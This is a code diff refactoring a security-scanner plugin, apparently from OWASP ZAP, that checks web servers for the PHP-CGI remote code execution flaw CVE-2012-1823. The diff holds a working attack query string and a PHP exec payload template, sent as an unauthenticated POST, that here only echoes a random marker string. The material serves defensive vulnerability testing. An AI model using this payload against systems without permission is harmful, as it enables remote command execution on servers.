@@ -55,7 +55,14 @@ public class RemoteCodeExecutionCVE20121823 extends AbstractAppPlugin {
 	/**
 	 * a random string (which remains constant across multiple runs, as long as Zap is not 
 	 */
-	static String randomString = RandomStringUtils.random(20, "abcdefghijklmnopqrstuvwxyz0123456789");
+	static final String RANDOM_STRING = RandomStringUtils.random(20, "abcdefghijklmnopqrstuvwxyz0123456789");
+
+	private static final String ATTACK_PARAM = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
+	private static final String PAYLOAD_BOILERPLATE = "<?php exec('<<<<COMMAND>>>>',$colm);echo join(\"\n\",$colm);die();?>";
+
+	private static final String[] PAYLOADS = {
+			PAYLOAD_BOILERPLATE.replace("<<<<COMMAND>>>>", "cmd.exe /C echo " + RANDOM_STRING),
+			PAYLOAD_BOILERPLATE.replace("<<<<COMMAND>>>>", "echo " + RANDOM_STRING) };
 
 	/**
 	 * returns the plugin id
@@ -130,23 +137,16 @@ public class RemoteCodeExecutionCVE20121823 extends AbstractAppPlugin {
 	@Override
 	public void scan() {
 		try {
-			String attackParam = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
-			String payloadBoilerPlate = "<?php exec('<<<<COMMAND>>>>',$colm);echo join(\"\n\",$colm);die();?>";
-			String [] payloads = {
-					payloadBoilerPlate.replace("<<<<COMMAND>>>>", "cmd.exe /C echo "+ randomString), 
-					payloadBoilerPlate.replace("<<<<COMMAND>>>>", "echo "+ randomString)
-					};
+			URI originalURI = getBaseMsg().getRequestHeader().getURI();
+			//construct a new URL based on the original URL, but without any of the original parameters
+			URI attackURI = createAttackUri(originalURI, ATTACK_PARAM);
+			if (attackURI == null) {
+				return;
+			}
+
 			//tries payloads for Linux/Unix, and Windows until we find something that works
-			for ( String payload : payloads) {
-				URI originalURI = getBaseMsg().getRequestHeader().getURI();
-				//byte [] originalResponseBody = getBaseMsg().getResponseBody().getBytes();
-				
-				//construct a new URL based on the original URL, but without any of the original parameters
-				URI attackURI = createAttackUri(originalURI, attackParam);
-				if (attackURI == null) {
-					return;
-				}
-				//and send it as a POST request, unauthorised, with the payload as the POST body.
+			for ( String payload : PAYLOADS) {
+				//send it as a POST request, unauthorised, with the payload as the POST body.
 				HttpRequestHeader requestHeader = new HttpRequestHeader(HttpRequestHeader.POST, attackURI, HttpRequestHeader.HTTP11);
 				HttpMessage attackmsg = new HttpMessage(requestHeader);
 				attackmsg.setRequestBody(payload);
@@ -159,8 +159,8 @@ public class RemoteCodeExecutionCVE20121823 extends AbstractAppPlugin {
 				//if the command was not recognised (by the host OS), we get a response size of 0 on PHP, but not on Tomcat
 				//to be sure it's not a false positive, we look for a string to be echoed  
 				if (	attackmsg.getResponseHeader().getStatusCode() == HttpStatus.SC_OK 
-						&& attackResponseBody.length>= randomString.length()
-						&& responseBody.startsWith(randomString)						
+						&& attackResponseBody.length>= RANDOM_STRING.length()
+						&& responseBody.startsWith(RANDOM_STRING)						
 						) {
 					if ( log.isDebugEnabled() ) {
 						log.debug("Remote Code Execution alert for: "+ originalURI.getURI());
